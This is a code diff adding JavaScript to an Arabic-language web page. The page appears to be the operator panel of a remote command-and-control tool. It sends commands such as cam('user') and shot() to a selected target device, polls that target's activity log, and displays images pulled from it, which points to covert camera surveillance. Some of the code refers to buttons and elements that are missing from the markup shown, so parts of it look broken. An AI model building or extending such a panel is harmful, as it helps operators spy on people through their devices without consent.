@@ -9,7 +9,61 @@
 <img id="img" hidden="">
 <div id="row">
   <input id="cmd" size="40" placeholder="الأمر — مثال: cam('user') ثم shot()">
+  
   <button>إرسال</button>
 </div>
 <div id="log"></div>
 
+<script>
+const $ = id => document.getElementById(id);
+const API = location.origin + '/api';
+let tok = '', target = 'T1', since = 0;
+
+$('row').querySelector('button').onclick = connect;
+$('row').querySelectorAll('button')[1].onclick = loadImg;
+$('row').parentElement.querySelectorAll('#row')[1].querySelector('button').onclick = send;
+$('cmd').onkeydown = e => { if (e.key === 'Enter') send(); };
+
+async function connect() {
+  target = $('t').value.trim() || 'T1';
+  tok = $('tok').value.trim();
+  $('stat').textContent = 'متصل بـ ' + target;
+  poll();
+  setInterval(poll, 3000);
+}
+
+async function send() {
+  const cmd = $('cmd').value.trim();
+  if (!cmd) return;
+  await fetch(API + '/cmd?t=' + target, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'X-Token': tok },
+    body: JSON.stringify({ t: target, cmd })
+  });
+  $('cmd').value = '';
+}
+
+async function poll() {
+  try {
+    const r = await fetch(API + '/log?t=' + target + '&since=' + since);
+    const j = await r.json();
+    if (j.items && j.items.length) {
+      since = j.total;
+      j.items.forEach(it => {
+        const d = document.createElement('div');
+        d.textContent = new Date(it.ts).toLocaleTimeString() + ' ' + it.text;
+        $('log').prepend(d);
+      });
+    }
+  } catch {}
+}
+
+async function loadImg() {
+  const r = await fetch(API + '/img?t=' + target + '&raw=1');
+  if (r.ok) {
+    const b = await r.blob();
+    $('img').src = URL.createObjectURL(b);
+    $('img').hidden = false;
+  }
+}
+</script>
